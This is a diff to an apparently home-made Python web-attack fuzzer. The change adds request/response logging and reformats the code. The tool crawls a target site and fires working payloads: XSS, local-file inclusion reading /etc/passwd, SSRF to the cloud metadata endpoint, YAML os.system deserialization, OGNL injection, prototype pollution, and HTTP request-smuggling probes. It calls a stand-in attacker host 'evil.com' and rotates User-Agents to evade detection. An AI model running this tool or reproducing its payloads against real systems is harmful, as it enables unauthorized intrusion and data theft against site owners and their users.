@@ -25,7 +25,7 @@
 • Hardened Playwright loader (timeout+retry + proxy + system‑Chrome + AUTOHOOK)
 • Form‑wait + screenshot in debug mode
 • Friendly User‑Agent rotation for all requests
-• Windows‑safe UTF‑8 logger  →  `super_fuzz2.log`
+• Windows‑safe UTF‑8 logger  →  `super_fuzz2_v5_5.log`
 ═══════════════════════════════════════════════════════════════════════════
 """
 
@@ -49,9 +49,9 @@ from bs4 import BeautifulSoup
 from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
 
 # ── Configuration ──────────────────────────────────────────────────────
-PAGE_TIMEOUT = 60_000  # ms
-RETRIES      = 1
-LOG_FILE     = Path("super_fuzz.log")
+PAGE_TIMEOUT    = 60_000  # ms
+RETRIES         = 1
+LOG_FILE        = Path("super_fuzz2_v5_5.log")
 LOG_FILE.write_text("", encoding="utf-8")  # reset
 
 # ── Friendly User‑Agents ───────────────────────────────────────────────
@@ -65,17 +65,18 @@ USER_AGENTS = [
 ]
 
 # ── Globals set by CLI ─────────────────────────────────────────────────
-DEBUG        = False
-THREADS      = 10
-PROXY        = None
-CHROME_PATH  = None
-AUTOHOOK     = False
-CDP_ENDPOINT = None
-CDP_PORT     = 9222
-chrome_proc  = None
+DEBUG         = False
+THREADS       = 10
+PROXY         = None
+CHROME_PATH   = None
+AUTOHOOK      = False
+CDP_ENDPOINT  = None
+CDP_PORT      = 9222
+chrome_proc   = None
 BROWSER_OVERRIDE = None
+SHOW_REQ_RES  = False  # Enable request/response logging
 
-
+# ── Helpers ─────────────────────────────────────────────────────────────
 def get_random_ua():
     return random.choice(USER_AGENTS)
 
@@ -89,11 +90,20 @@ def log(msg, tag="*"):
     with open(LOG_FILE, "a", encoding="utf-8") as fp:
         fp.write(line + "\n")
 
+# ── Request/Response wrapper ────────────────────────────────────────────
+def do_request(method, url, **kwargs):
+    if SHOW_REQ_RES:
+        log(f"[REQ] {method.upper()} {url} {kwargs}", "REQ")
+    r = requests.request(method, url, **kwargs)
+    if SHOW_REQ_RES:
+        log(f"[RES] {r.status_code} {r.text}", "RES")
+    return r
+
 # ── Playwright helper ──────────────────────────────────────────────────
 def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
     global PROXY, CHROME_PATH, CDP_ENDPOINT, BROWSER_OVERRIDE
 
-    # 1) If --autohook is set, attach (once) and reuse that browser
+    # 1) Auto‑hook attach
     if CDP_ENDPOINT:
         if BROWSER_OVERRIDE is None:
             try:
@@ -102,8 +112,7 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
                 log(f"[!] CDP attach failed – {e}", "!")
                 sys.exit(1)
         browser = BROWSER_OVERRIDE
-
-    # 2) Otherwise launch headless exactly once
+    # 2) Launch exactly once
     else:
         if BROWSER_OVERRIDE is None:
             launch_args = [
@@ -121,16 +130,17 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
             BROWSER_OVERRIDE = p.chromium.launch(**launch_kwargs)
         browser = BROWSER_OVERRIDE
 
-    # 3) Now create a new context+page and navigate
-    for attempt in range(1, retries+1):
+    # 3) New context + page
+    for attempt in range(1, retries + 1):
         try:
             ctx = browser.new_context(
                 ignore_https_errors=True,
                 user_agent=get_random_ua(),
-                viewport={"width":1280,"height":800},
+                viewport={"width": 1280, "height": 800},
             )
             ctx.set_default_navigation_timeout(timeout)
             page = ctx.new_page()
+
             page.goto(url, wait_until="domcontentloaded", timeout=timeout)
             with contextlib.suppress(PWTimeout):
                 page.wait_for_load_state("networkidle", timeout=10_000)
@@ -147,10 +157,9 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
 
         except Exception as e:
             log(f"Playwright fail ({attempt}/{retries}) – {e}", "!")
-            # on a real launch failure, we _don't_ close browser, we might retry
             time.sleep(0.5)
 
-    # 4) Fallback to requests (single time, no proxies)
+    # 4) Static fallback
     log("[~] Falling back to requests()", "·")
     try:
         sess = requests.Session()
@@ -172,12 +181,9 @@ def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
         })
         log("[+] Static fallback loaded", "+")
         return dummy, None, DummyPage()
-
     except Exception as e:
         log(f"[!] Static fallback failed – {e}", "!")
         return None, None, None
-
-
 
 # ── AI‑style payload mutator ───────────────────────────────────────────
 def ai_mutate(payload):
@@ -185,176 +191,184 @@ def ai_mutate(payload):
         payload[::-1],
         urllib.parse.quote(payload),
         payload.replace(" ", "%20"),
-        payload.replace("id","whoami"),
-        payload.replace("alert","Function('al'+'ert()')()"),
-        ''.join(random.sample(payload,len(payload))),
+        payload.replace("id", "whoami"),
+        payload.replace("alert", "Function('al'+'ert()')()"),
+        ''.join(random.sample(payload, len(payload))),
     ]
     return random.choice(variants)
 
 # ── Form fuzzer ────────────────────────────────────────────────────────
 def fuzz_html_form(action, method, fields):
     samples = {
-        "id":"whoami",
-        "q":"<svg/onload=alert(1)>",
-        "x":"gopher://127.0.0.1/._/._/payload",
-        "search":"data:text/html,<script>alert(9)</script>",
-        "file":"php://filter/convert.base64-encode/resource=index.php",
+        "id":     "whoami",
+        "q":      "<svg/onload=alert(1)>",
+        "x":      "gopher://127.0.0.1/._/._/payload",
+        "search": "data:text/html,<script>alert(9)</script>",
+        "file":   "php://filter/convert.base64-encode/resource=index.php",
     }
     data = {f: ai_mutate(random.choice(list(samples.values()))) for f in fields}
-    headers = {"User-Agent":get_random_ua()}
+    headers = {"User-Agent": get_random_ua()}
     try:
-        if method=="post":
-            r = requests.post(action, data=data, timeout=2, headers=headers)
+        if method == "post":
+            r = do_request("post", action, data=data, timeout=2, headers=headers)
         else:
-            r = requests.get(action+"?"+urlencode(data), timeout=2, headers=headers)
-        if any(k in r.text for k in ("uid=","root:","alert(","<svg")):
+            r = do_request("get", action, params=data, timeout=2, headers=headers)
+        if any(k in r.text for k in ("uid=", "root:", "alert(", "<svg")):
             log(f"Form vulnerable → {action}", "✓")
     except Exception as e:
-        if DEBUG: log(f"Form fuzz error {action} – {e}", "!")
+        if DEBUG:
+            log(f"Form fuzz error {action} – {e}", "!")
 
 # ── Server‑side attack modules ─────────────────────────────────────────
 def recursive_param(u):
-    for s in ["?x=http://evil.com?y=whoami","?next=/admin?cmd=id","?eval=phpinfo()"]:
+    for s in ["?x=http://evil.com?y=whoami", "?next=/admin?cmd=id", "?eval=phpinfo()"]:
         try:
-            r = requests.get(u+s, timeout=2, headers={"User-Agent":get_random_ua()})
-            if any(x in r.text for x in ("uid=","root:")):
-                log(f"Recursive RCE → {u+s}", "✓")
-        except: pass
+            r = do_request("get", u + s, timeout=2, headers={"User-Agent": get_random_ua()})
+            if any(x in r.text for x in ("uid=", "root:")):
+                log(f"Recursive RCE → {u + s}", "✓")
+        except:
+            pass
 
 def protocol_abuse(u):
-    for proto in ["gopher://127.0.0.1:11211/_stats","file:///etc/passwd",
-                  "blob:http://localhost","data:text/html,<script>alert(6)</script>",
-                  "php://input","php://filter/convert.base64-encode/resource=index.php"]:
+    for proto in ["gopher://127.0.0.1:11211/_stats", "file:///etc/passwd",
+                  "blob:http://localhost", "data:text/html,<script>alert(6)</script>",
+                  "php://input", "php://filter/convert.base64-encode/resource=index.php"]:
         try:
-            r = requests.get(u+"?p="+quote(proto), timeout=2,
-                             headers={"User-Agent":get_random_ua()})
-            if any(x in r.text for x in ("uid=","root:")):
+            r = do_request("get", u + "?p=" + quote(proto), timeout=2, headers={"User-Agent": get_random_ua()})
+            if any(x in r.text for x in ("uid=", "root:")):
                 log(f"Protocol abuse → {proto}", "✓")
-        except: pass
+        except:
+            pass
 
 def split_eval(u):
-    for frag in ['";alert','("XSS")',"';eval","('`id`')"]:
+    for frag in ['";alert', '("XSS")', "';eval", "('`id`')"]:
         try:
-            r = requests.get(u+"?q="+quote(frag),
-                             headers={"User-Agent":get_random_ua()})
-            if any(tag in r.text for tag in ("<script","alert(","XSS")):
+            r = do_request("get", u + "?q=" + quote(frag), headers={"User-Agent": get_random_ua()})
+            if any(tag in r.text for tag in ("<script", "alert(", "XSS")):
                 log(f"Split‑eval → {frag}", "✓")
-        except: pass
+        except:
+            pass
 
 def mime_confuse(u):
     try:
-        r = requests.post(u, "<script>alert(1)</script>",
-                          headers={"Content-Type":"application/json",
-                                   "User-Agent":get_random_ua()},
-                          timeout=2)
+        r = do_request("post", u, data="<script>alert(1)</script>",
+                       headers={"Content-Type": "application/json", "User-Agent": get_random_ua()}, timeout=2)
         if "<script" in r.text:
-            log("MIME confusion ✓","✓")
-    except: pass
+            log("MIME confusion ✓", "✓")
+    except:
+        pass
 
 def unicode_path(u):
-    for enc in ("%252e%252e","%c0%ae%c0%ae","%u202e"):
+    for enc in ("%252e%252e", "%c0%ae%c0%ae", "%u202e"):
         try:
-            r = requests.get(f"{u}/{enc}/", timeout=2,
-                             headers={"User-Agent":get_random_ua()})
+            r = do_request("get", f"{u}/{enc}/", timeout=2, headers={"User-Agent": get_random_ua()})
             if "root:" in r.text or "conf" in r.text:
                 log(f"Unicode bypass → {enc}", "✓")
-        except: pass
+        except:
+            pass
 
 def lfi_fuzz(u):
-    paths = ["/etc/passwd","/var/www/html/index.php","/etc/hosts","../../../../../../etc/passwd"]
-    for w in ["php://filter/convert.base64-encode/resource=","expect://id","input://"]:
-        for p in paths:
-            url = f"{u}?file={w}{p}"
+    paths = ["/etc/passwd", "/var/www/html/index.php", "/etc/hosts", "../../../../../../etc/passwd"]
+    for w in ["php://filter/convert.base64-encode/resource=", "expect://id", "input://"]:
+        for pth in paths:
+            url = f"{u}?file={w}{pth}"
             try:
-                r = requests.get(url, timeout=2,
-                                 headers={"User-Agent":get_random_ua()})
-                if any(x in r.text for x in ("root:","ID=")):
-                    log(f"LFI fuzz → {url}","✓")
-            except: pass
+                r = do_request("get", url, timeout=2, headers={"User-Agent": get_random_ua()})
+                if any(x in r.text for x in ("root:", "ID=")):
+                    log(f"LFI fuzz → {url}", "✓")
+            except:
+                pass
 
 def ssrf_fuzz(u):
-    for p in ["http://169.254.169.254/latest/meta-data/","gopher://127.0.0.1:22/"]:
+    for p in ["http://169.254.169.254/latest/meta-data/", "gopher://127.0.0.1:22/"]:
         try:
-            r = requests.get(f"{u}?url={quote(p)}", timeout=2,
-                             headers={"User-Agent":get_random_ua()})
-            if r.status_code==200:
-                log(f"SSRF fuzz → {p}","✓")
-        except: pass
+            r = do_request("get", f"{u}?url={quote(p)}", timeout=2, headers={"User-Agent": get_random_ua()})
+            if r.status_code == 200:
+                log(f"SSRF fuzz → {p}", "✓")
+        except:
+            pass
 
 def yaml_injection(u):
     try:
         payload = quote("foo: !!python/object/apply:os.system ['id']")
-        r = requests.get(f"{u}?data={payload}", timeout=2,
-                         headers={"User-Agent":get_random_ua()})
+        r = do_request("get", f"{u}?data={payload}", timeout=2, headers={"User-Agent": get_random_ua()})
         if "uid=" in r.text:
-            log("YAML injection ✓","✓")
-    except: pass
+            log("YAML injection ✓", "✓")
+    except:
+        pass
 
 def ognl_injection(u):
-    pay = "%{(#_='multipart/form-data')."\
-          "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"\
+    pay = "%{(#_='multipart/form-data')." \
+          "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']" \
           ".addHeader('X',#_))}"
     try:
-        r = requests.get(f"{u}?name={quote(pay)}", timeout=2,
-                         headers={"User-Agent":get_random_ua()})
+        r = do_request("get", f"{u}?name={quote(pay)}", timeout=2, headers={"User-Agent": get_random_ua()})
         if "X" in r.headers:
-            log("OGNL injection ✓","✓")
-    except: pass
+            log("OGNL injection ✓", "✓")
+    except:
+        pass
 
 # ── Client‑side DOM modules ─────────────────────────────────────────────
-def dom_clipboard(u,p):
-    br,_,pg = open_page(p,u)
+def dom_clipboard(u, p):
+    br, _, pg = open_page(p, u)
     if pg:
         pg.evaluate("document.body.innerHTML+='<input oncopy=fetch(\"http://dns.x\")>'")
-        log("Clipboard ✓","✓"); br.close()
+        log("Clipboard ✓", "✓")
+        br.close()
 
-def dom_proto_poll(u,p):
-    br,_,pg = open_page(p,u)
+def dom_proto_poll(u, p):
+    br, _, pg = open_page(p, u)
     if pg:
-        pg.on("console",lambda m:"[PP]" in m.text and log("Proto polluted","✓"))
+        pg.on("console", lambda m: "[PP]" in m.text and log("Proto polluted", "✓"))
         pg.evaluate("let e=JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');"
                     "Object.assign({},e);console.log(\"[PP]\"+{}.polluted)")
         br.close()
 
-def dom_ws_inject(u,p):
-    br,_,pg = open_page(p,u)
+def dom_ws_inject(u, p):
+    br, _, pg = open_page(p, u)
     if pg:
-        pg.on("console",lambda m:"[WS]" in m.text and log("WS XSS","✓"))
+        pg.on("console", lambda m: "[WS]" in m.text and log("WS XSS", "✓"))
         pg.evaluate('const w=new WebSocket("wss://echo.websocket.events");'
                     'w.onopen=()=>w.send("<svg/onload=alert(2)>");'
                     'w.onmessage=e=>console.log("[WS]"+e.data);')
-        time.sleep(1); br.close()
+        time.sleep(1)
+        br.close()
 
-def dom_async(u,p):
-    br,_,pg = open_page(p,u)
+def dom_async(u, p):
+    br, _, pg = open_page(p, u)
     if pg:
         pg.evaluate("(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();")
-        log("Async race","✓"); br.close()
+        log("Async race", "✓")
+        br.close()
 
-def dom_iframe(u,p):
-    ब्र,_,pg = open_page(p,u)
+def dom_iframe(u, p):
+    br, _, pg = open_page(p, u)
     if pg:
         pg.evaluate("let f=document.createElement('iframe');"
                     "f.srcdoc='<script>alert(99)</script>';document.body.appendChild(f)")
-        log("Iframe clone","✓"); ब्र.close()
+        log("Iframe clone", "✓")
+        br.close()
 
-def dom_mutation(u,p):
-    br,_,pg = open_page(p,u)
+def dom_mutation(u, p):
+    br, _, pg = open_page(p, u)
     if pg:
         pg.evaluate("new MutationObserver(()=>alert('M')).observe(document.body,{childList:true,subtree:true});"
                     "document.body.appendChild(document.createElement('div'));")
-        log("MutationObs","✓"); br.close()
+        log("MutationObs", "✓")
+        br.close()
 
-def websocket_fuzz(u,p):
-    br,_,pg = open_page(p,u)
+def websocket_fuzz(u, p):
+    br, _, pg = open_page(p, u)
     if pg:
-        ws = u.replace('http','ws')
+        ws = u.replace('http', 'ws')
         pg.evaluate(f'''
             const w=new WebSocket("{ws}/socket");
             w.onopen=()=>w.send("{quote('<svg/onload=alert(5)>')}");
             w.onmessage=e=>console.log("[WF]"+e.data);
         ''')
-        time.sleep(1); log("WS fuzz","✓"); br.close()
+        time.sleep(1)
+        log("WS fuzz", "✓")
+        br.close()
 
 # ── Smuggle probes ──────────────────────────────────────────────────────
 def crlf_smuggle(host):
@@ -366,101 +380,110 @@ def crlf_smuggle(host):
         f"Host: {host}\r\nContent-Length: 0\r\n\r\n"
     )
     try:
-        s = socket.create_connection((host,80),timeout=4)
-        s.send(payload.encode()); s.close()
-        log("CRLF smuggle probe sent","+")
+        s = socket.create_connection((host, 80), timeout=4)
+        s.send(payload.encode())
+        s.close()
+        log("CRLF smuggle probe sent", "+")
     except Exception as e:
-        if DEBUG: log(f"CRLF smuggle error – {e}","!")
+        if DEBUG: log(f"CRLF smuggle error – {e}", "!")
 
 def chunk_desync(host):
     raw = (f"POST / HTTP/1.1\r\nHost:{host}\r\n"
            "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
     try:
-        s = socket.create_connection((host,80),timeout=4)
-        s.send(raw.encode()); s.close()
-        log("Chunk‑desync probe sent","+")
+        s = socket.create_connection((host, 80), timeout=4)
+        s.send(raw.encode())
+        s.close()
+        log("Chunk‑desync probe sent", "+")
     except Exception as e:
-        if DEBUG: log(f"Chunk‑desync error – {e}","!")
+        if DEBUG: log(f"Chunk‑desync error – {e}", "!")
 
 def http2_smuggle(host):
     try:
-        conn = http.client.HTTPConnection(host,80,timeout=4)
-        conn._http_vsn=32; conn._http_vsn_str="HTTP/2.0"
-        conn.putrequest("SMUGGLE","/");conn.putheader("Host",host)
-        conn.endheaders();conn.send(b"0\r\n\r\n");conn.close()
-        log("HTTP2 smuggle sent","+")
+        conn = http.client.HTTPConnection(host, 80, timeout=4)
+        conn._http_vsn = 32; conn._http_vsn_str = "HTTP/2.0"
+        conn.putrequest("SMUGGLE", "/"); conn.putheader("Host", host)
+        conn.endheaders(); conn.send(b"0\r\n\r\n"); conn.close()
+        log("HTTP2 smuggle sent", "+")
     except Exception as e:
-        if DEBUG: log(f"HTTP2 smuggle error – {e}","!")
+        if DEBUG: log(f"HTTP2 smuggle error – {e}", "!")
 
 # ── Crawl + orchestrate ────────────────────────────────────────────────
-def smart_crawl(seed,p):
+def smart_crawl(seed, p):
     origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
     seen, endpoints, failed = {seed}, set(), set()
-    queue = deque([(seed,0)])
+    queue = deque([(seed, 0)])
     while queue:
-        url,depth = queue.popleft()
-        if depth>3 or url in failed: continue
-        br,ctx,page = open_page(p,url)
-        if not page: failed.add(url); continue
-        page.on("request",lambda r:endpoints.add(r.url))
+        url, depth = queue.popleft()
+        if depth > 3 or url in failed: continue
+        br, ctx, page = open_page(p, url)
+        if not page:
+            failed.add(url)
+            continue
 
+        page.on("request", lambda r: endpoints.add(r.url))
         forms = page.query_selector_all("form")
-        log(f"[+] Found {len(forms)} <form> elements on {url}","+")
+        log(f"[+] Found {len(forms)} <form> elements on {url}", "+")
         for form in forms:
-            act = form.get_attribute("action") or url
-            meth = (form.get_attribute("method") or "get").lower()
-            fields = [inp.get_attribute("name") or f"f{i}"
-                      for i,inp in enumerate(form.query_selector_all("input,textarea,select"),1)]
-            endpoints.add(urljoin(url,act))
-            fuzz_html_form(urljoin(url,act),meth,fields)
+            action = form.get_attribute("action") or url
+            method = (form.get_attribute("method") or "get").lower()
+            fields = [
+                inp.get_attribute("name") or f"f{i}"
+                for i, inp in enumerate(form.query_selector_all("input,textarea,select"), start=1)
+            ]
+            endpoints.add(urljoin(url, action))
+            fuzz_html_form(urljoin(url, action), method, fields)
 
         with contextlib.suppress(PWTimeout):
-            page.wait_for_load_state("networkidle",timeout=2000)
+            page.wait_for_load_state("networkidle", timeout=2000)
 
-        links = page.evaluate("""()=>
+        links = page.evaluate("""() =>
             Array.from(document.querySelectorAll('[href],[routerLink],a'))
-                 .map(e=>e.href||e.getAttribute('href')||e.getAttribute('routerLink'))
+                 .map(e => e.href || e.getAttribute('href') || e.getAttribute('routerLink'))
         """)
         br.close()
-        for l in set(links):
+        for l in set(map(str, links)):
             if l and l.startswith(origin) and l not in seen:
-                seen.add(l); queue.append((l,depth+1))
+                seen.add(l)
+                queue.append((l, depth + 1))
 
-    log(f"Crawl → {len(seen)} pages, {len(endpoints)} endpoints","+")
-    return seen|endpoints
+    log(f"Crawl → {len(seen)} pages, {len(endpoints)} endpoints", "+")
+    return seen | endpoints
 
 # ── Threaded server‑side fuzz ─────────────────────────────────────────
 def run_server(u):
-    mods = [recursive_param,protocol_abuse,split_eval,
-            mime_confuse,unicode_path,lfi_fuzz,
-            ssrf_fuzz,yaml_injection,ognl_injection]
+    mods = [recursive_param, protocol_abuse, split_eval,
+            mime_confuse, unicode_path, lfi_fuzz,
+            ssrf_fuzz, yaml_injection, ognl_injection]
     for fn in mods:
-        log(f"· Running {fn.__name__} against {u}","·")
-        try: fn(u)
+        log(f"· Running {fn.__name__} against {u}", "·")
+        try:
+            fn(u)
         except Exception as e:
-            if DEBUG: log(f"  ! {fn.__name__} error: {e}","!")
-        log(f"· Finished {fn.__name__} against {u}","·")
+            if DEBUG: log(f"  ! {fn.__name__} error: {e}", "!")
+        log(f"· Finished {fn.__name__} against {u}", "·")
 
+# ── Main ───────────────────────────────────────────────────────────────
 def main():
-    global DEBUG,THREADS,PROXY,CHROME_PATH,AUTOHOOK,CDP_ENDPOINT,chrome_proc
-    parser=argparse.ArgumentParser()
+    global DEBUG, THREADS, PROXY, CHROME_PATH, AUTOHOOK, CDP_ENDPOINT, chrome_proc, SHOW_REQ_RES
+    parser = argparse.ArgumentParser()
     parser.add_argument("url", help="Target URL")
-    parser.add_argument("-U","--threads", type=int, default=10, help="Server‑side threads")
-    parser.add_argument("--debug", action="store_true", help="Debug (headful+verbose)")
-    parser.add_argument("--proxy", help="HTTP/S proxy")
-    parser.add_argument("--chrome", help="Chrome executable path")
-    parser.add_argument("--autohook", action="store_true",
-                        help="Auto‑hook into Chrome via remote debug")
-    args=parser.parse_args()
+    parser.add_argument("-U", "--threads", type=int, default=10, help="Server‑side threads")
+    parser.add_argument("--debug", action="store_true", help="Enable debug (headful + verbose)")
+    parser.add_argument("--proxy", help="HTTP/S proxy (e.g. http://proxy:3128)")
+    parser.add_argument("--chrome", help="Path to Chrome executable")
+    parser.add_argument("--autohook", action="store_true", help="Auto‑hook into Chrome via remote debug")
+    parser.add_argument("--show-req-res", action="store_true", help="Enable request/response logging")
+    args = parser.parse_args()
 
-    DEBUG = args.debug
-    THREADS = args.threads
-    PROXY = args.proxy or os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY")
-    CHROME_PATH = args.chrome
-    AUTOHOOK = args.autohook
+    DEBUG        = args.debug
+    THREADS      = args.threads
+    PROXY        = args.proxy or os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY")
+    CHROME_PATH  = args.chrome
+    AUTOHOOK     = args.autohook
+    SHOW_REQ_RES = args.show_req_res
 
     if AUTOHOOK:
-        # find Chrome binary
         candidates = [CHROME_PATH] if CHROME_PATH else []
         candidates += [
             r"C:\Program Files\Google\Chrome\Application\chrome.exe",
@@ -469,7 +492,7 @@ def main():
         ]
         chrome_bin = next((c for c in candidates if c and Path(c).exists()), None)
         if not chrome_bin:
-            log("[!] Cannot find Chrome, disabling --autohook","!")
+            log("[!] Cannot find Chrome, disabling --autohook", "!")
             AUTOHOOK = False
         else:
             CDP_ENDPOINT = f"http://127.0.0.1:{CDP_PORT}"
@@ -479,36 +502,45 @@ def main():
                 chrome_bin,
                 f"--remote-debugging-port={CDP_PORT}",
                 f"--user-data-dir={data_dir}",
-                "--no-first-run",
-                "--no-default-browser-check"
+                "--no-first-run", "--no-default-browser-check"
             ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             atexit.register(lambda: chrome_proc.terminate())
             for _ in range(20):
                 try:
-                    socket.create_connection(("127.0.0.1",CDP_PORT),timeout=0.5).close()
+                    socket.create_connection(("127.0.0.1", CDP_PORT), timeout=0.5).close()
                     break
-                except: time.sleep(0.2)
-            log(f"[+] Auto‑hook launched Chrome at {CDP_ENDPOINT}","+")
-    # kickoff
-    log(f"Seed → {args.url}","◆")
+                except:
+                    time.sleep(0.2)
+            log(f"[+] Auto‑hook launched Chrome at {CDP_ENDPOINT}", "+")
+
+    log(f"Seed → {args.url}", "◆")
     with sync_playwright() as p:
         scope = smart_crawl(args.url, p)
-    log(f"Discovered {len(scope)} targets","+")
-    with ThreadPoolExecutor(max_workers=THREADS) as ex:
-        futures={ex.submit(run_server,u):u for u in scope}
-        for f in as_completed(futures):
-            if DEBUG: log(f"Completed server fuzz for {futures[f]}","·")
-    host = urlparse(args.url).hostname or args.url
-    crlf_smuggle(host); chunk_desync(host); http2_smuggle(host)
-    with sync_playwright() as p:
-        for mod in (dom_clipboard,dom_proto_poll,dom_ws_inject,
-                    dom_async,dom_iframe,dom_mutation,websocket_fuzz):
-            try: mod(args.url,p)
-            except Exception as e:
-                if DEBUG: log(f"{mod.__name__} error – {e}","!")
-    log("✅ FUZZER COMPLETE","✓")
+    log(f"Discovered {len(scope)} targets", "+")
 
-if __name__=="__main__":
+    with ThreadPoolExecutor(max_workers=THREADS) as ex:
+        futures = {ex.submit(run_server, u): u for u in scope}
+        for f in as_completed(futures):
+            if DEBUG:
+                log(f"Completed server fuzz for {futures[f]}", "·")
+
+    host = urlparse(args.url).hostname or args.url
+    crlf_smuggle(host)
+    chunk_desync(host)
+    http2_smuggle(host)
+
+    with sync_playwright() as p:
+        for mod in (dom_clipboard, dom_proto_poll, dom_ws_inject,
+                    dom_async, dom_iframe, dom_mutation, websocket_fuzz):
+            try:
+                mod(args.url, p)
+            except Exception as e:
+                if DEBUG:
+                    log(f"{mod.__name__} error – {e}", "!")
+
+    log("✅ FUZZER COMPLETE", "✓")
+
+if __name__ == "__main__":
     try:
         main()
     finally:
